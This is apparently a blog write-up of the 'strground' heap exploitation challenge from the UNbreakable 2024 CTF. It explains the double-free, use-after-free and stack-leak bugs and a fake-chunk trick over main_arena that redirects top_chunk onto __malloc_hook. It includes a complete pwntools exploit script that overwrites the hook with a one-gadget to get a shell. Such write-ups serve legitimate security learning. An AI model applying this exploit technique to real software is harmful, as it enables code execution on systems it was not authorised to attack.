---
layout: post
title:  "UNbreakable 2024 strground Writeup"
date:   2024-03-29 15:17:43 +0000
categories: writeups
description: "Interesting heap exploitation trick to bypass incorrect fastbin index🤔"
---

### Summary
Strground is a heap exploitation challenge made by one of my colleagues from [**The Few Chosen**](https://ctftime.org/team/140885/). 

The challenge itself wasn't hard, but it involved a trick that I didn't know of. After reading numerous random writeups I figured the trick was to craft a chunk over `main_arena` and overwrite `top_chunk` pointer to get a chunk over `malloc_hook`.

### Solution:
First let's analyze the binary:

The program sets up a structure to store pointers to chunks in:
{% highlight C %}
for ( i = 0; i <= 14; ++i )
    slots[i] = 1;
  cnt = 0;
  chunks = malloc(0x78uLL);
  for ( j = 0; j < 15; ++j )
    chunks[j] = 0LL;
{% endhighlight %}

Then we notice that there are a handful of functionalities. We can `CREATE` a chunk, `DELETE`, `PRINT` or `ENCODE`.

Let's identify some core vulnerabilities and observations that will help us craft the exploit:

- When we create a chunk, the maximum size is `0x60`(0x5f is read so malloc will return `0x5f`). The program stores the pointer to the chunk in the `chunks` array and increases a counter:

![heap1](/img/strground-writeup/heap1.png)

- The main vuln lies in the `DELETE` function. It doesn't nullify the pointer in the `chunks` array, so we can perform a double free. More on that later.

- The `PRINT` function is vulnerable as well because we can print a freed chunk. This is a `use-after-free` vulnerability and can be used to leak a heap address. More exactly, we can leak the `forward` pointer in the fastbin single linked list.

- The `ENCODE` function is vulnerable as well and we use it to leak a libc address. The main problem is that it doesn't initialize the buffer that it's copying chunk data to. This means that we can leak address from the stack. More on that later.

- We can also note that this libc doesn't use `tcache`.

### Why is this challenge difficult?

Normally, we can just leak some libc address, use double free to overwrite a fastbin pointer to point to `__malloc_hook`-0x23 and then overwrite `__malloc_hook` with a one gadget. NOTE: we use `-0x23` because before `__malloc_hook` there are some libc addreses and at `-0x23` there is the following data: `0x000000000000007f`. Why is this important? Libc implements a security check on the fastbin freelist. It checks if the size of the chunks in the linked list corresponts to the size of the fastbin. If it doesn't, it will throw an error.

Easy peasy, right? No. We cannot allocate a chunk that is greater than `0x60` and therefore, there is no way to perform a double free attack inside the `0x70` fastbin.

### The workaround

There is a trick to this. Let's take a look at the main_arena:

![heap2](/img/strground-writeup/heap2.png)

Here is the main arena after some steps in my exploit. We can see that the `HEAD` pointer for a fastbin resides at `main_arena+24` and in starts with `0x5e`.

Taking into consideration what I explained earlier, a chunk over the `main_arena` would work and would not throw an `incorrect fastbin index` error. To be more precise I crafted a chunk at `main_arena+21`.

### Okay but what now?

`__malloc_hook` is right above the main arena. We can't allocate memory backwards. 

The main trick of this challenge is to overwrite the `top_chunk` pointer to point to a `__malloc_hook-0x23`. This way, when we allocate a chunk, the allocator will try to give as a chunk from the `top_chunk` and the shrink it like it normally does, except now, it will allocate from `__malloc_hook-0x23`.

Note that the top_chunk pointer is at `main_arena+96`. This can be confirmed either by looking at `malloc_state` struct in libc source code or just by looking what the address at `main_arena+96` is.

![heap3](/img/strground-writeup/heap3.png)

### The plan

1. Leak a heap address using the `ENCODE` function. I ended up leakin a heap address too but it wasn't necessary.

2. Use double free to craft a chunk over the `main_arena` and overwrite the `top_chunk` pointer.

3. Allocate a chunk and overwrite `__malloc_hook` with a one gadget.

### The exploit

To leak a libc address, let's have a look at `main` stack frame before anything:

![heap4](/img/strground-writeup/heap4.png)

At `$rsp+0xa8` there is a libc address. We can leak this by allocating a chunk with `57` A's and the using the encode function. It works because the program uses printf that prints until a null byte.

{% highlight python %}
    add(b"A" * 57)
    add(b"B" * 0x40)
    add(b"C" * 0x40)
    add(b"D" * 0x20)

    libc_leak = encode_chunk(0).split(b"D" * 56)[1][:6]
    print(libc_leak)
    libc_leak = list(libc_leak)
    for i in range(len(libc_leak)):
        libc_leak[i] -= 3
        if libc_leak[i] < 0:
            libc_leak[i] += 256
    print(libc_leak)
    libc_leak = bytes(libc_leak)
    libc_leak = u64(libc_leak + b"\x00\x00")
    libc.address = libc_leak - 0x5e2741
    log.info(f"libc leak: {hex(libc.address)}")
{% endhighlight %}

Note: There was a slight problem here. Libc's leak offset was different on remote so I just used the docker provided to find the correct offset.

{% highlight python %}
    delete(3)
    delete(1)
    delete(2)
    delete(1)
    heap_leak = print_chunk(1)
    heap_leak = u64(heap_leak + b"\x00\x00") - 0x110
    log.info(f"heap base: {hex(heap_leak)}")

    add(p64(libc.sym['main_arena'] + 21) + b"\x00" * (0x40 - 8))
{% endhighlight %}

Ignore the heap_leak, the important part is the double free on chunk 1. I freed chunk 2 between the double frees on chunk 1 to bypass a fastbin double free check. 

Let's take a look at the heap now:

![heap5](/img/strground-writeup/heap5.png)

Look at 0x50 fastbin. It has a chunk at `main_arena+21`. This is the chunk that we will use to overwrite the `top_chunk` pointer. Now when we allocate chunks of size 0x50, it will eventually give us one over `main_arena`.

Here is the chunk data that will overwrite the `main_arena`:
{% highlight python %}
    chungus = b"\x00" * 3 + p64(0) * 7 + p64(libc.sym['__malloc_hook'] - 0x23) + b"\x00" * (0x40 - 8 * 8 - 3)
{% endhighlight %}

Full solve script:
{% highlight python %}
#!/usr/bin/env python3

from numpy import delete
from pwn import *
from pyrsistent import b

exe = ELF("./chall_patched")
libc = ELF("./libc-2.30.so")
ld = ELF("./ld-2.30.so")

context.binary = exe
context.terminal = ["tmux", "splitw", "-h"]
#context.log_level = "DEBUG"

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("34.89.210.219", 30322)

    return r

r = conn()

def add(data):
    r.sendline(b"CREATE " + data)
    r.recvuntil(b"Created string.")

def delete(idx):
    r.sendline(b"DELETE " + str(idx).encode())
    r.recvuntil(b"Deleted")

def print_chunk(idx):
    r.sendline(b"PRINT " + str(idx).encode())
    r.recvuntil(b"is: ")
    return r.recvline()[:-1]

def encode_chunk(idx):
    r.sendline(b"ENCODE " + str(idx).encode())
    r.recvuntil(b"Encoded your string!")
    r.recvline()
    return r.recvline().strip()

def main():

    add(b"A" * 57)
    add(b"B" * 0x40)
    add(b"C" * 0x40)
    add(b"D" * 0x20)

    libc_leak = encode_chunk(0).split(b"D" * 56)[1][:6]
    print(libc_leak)
    libc_leak = list(libc_leak)
    for i in range(len(libc_leak)):
        libc_leak[i] -= 3
        if libc_leak[i] < 0:
            libc_leak[i] += 256
    print(libc_leak)
    libc_leak = bytes(libc_leak)
    libc_leak = u64(libc_leak + b"\x00\x00")
    libc.address = libc_leak - 0x5e2741
    log.info(f"libc leak: {hex(libc_leak)}")
    log.info(f"libc leak: {hex(libc.address)}")

    delete(3)
    delete(1)
    delete(2)
    delete(1)
    heap_leak = print_chunk(1)
    heap_leak = u64(heap_leak + b"\x00\x00") - 0x110
    log.info(f"heap base: {hex(heap_leak)}")

    add(p64(libc.sym['main_arena'] + 21) + b"\x00" * (0x40 - 8))

    add(b"E" * 0x40)
    add(b"F" * 0x40)
    log.info(hex(heap_leak))
    

    chungus = b"\x00" * 3 + p64(0) * 7 + p64(libc.sym['__malloc_hook'] - 0x23) + b"\x00" * (0x40 - 8 * 8 - 3)

    add(chungus)
    one_gadget = libc.address + 0xe1fa1
    
    
    luma = b"i" * (50 - 8 * 4 + 1) + p64(one_gadget)
    luma += (50 - len(luma)) * b"A"
    assert(len(luma) == 50)
    add(luma) 

    # gdb.attach(r, '''
    #             heap bins
    #             heap chunks
    #            ''')
    input("wait")
    r.sendline(b"CREATE AAAAAAAAAAAAAAAAAAA")
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
{% endhighlight %}

#### Profit

![heap6](/img/strground-writeup/heap6.png)

Note that it's a finicky exploit so I ran it like this until it worked:

```bash
while true; do python3 solve.py REMOTE; done
```

---
## Leave your thoughts down below!

